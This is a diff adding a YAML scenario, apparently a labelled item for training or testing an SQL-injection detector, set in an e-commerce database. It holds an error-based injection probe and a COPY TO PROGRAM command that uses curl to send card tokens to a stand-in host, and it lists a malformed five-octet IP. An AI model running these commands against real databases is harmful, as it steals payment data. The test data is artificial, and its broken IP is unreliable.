@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_29_sql_injection_mal_785m
+family_id: gen_ecommerce_29_sql_injection_fam_785
+domain: ecommerce
+time_of_day: 02:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT order_id, status FROM orders WHERE order_id = CAST((SELECT card_token
+      FROM payments LIMIT 1) AS INTEGER)
+  - step_id: exfil
+    sql: COPY (SELECT card_token, card_last4 FROM payments) TO PROGRAM 'curl -sX POST
+      https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 194.147.78.10.5
+      port: 8080
+matched_pair_id: gen_ecommerce_29_sql_injection_pair_785
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
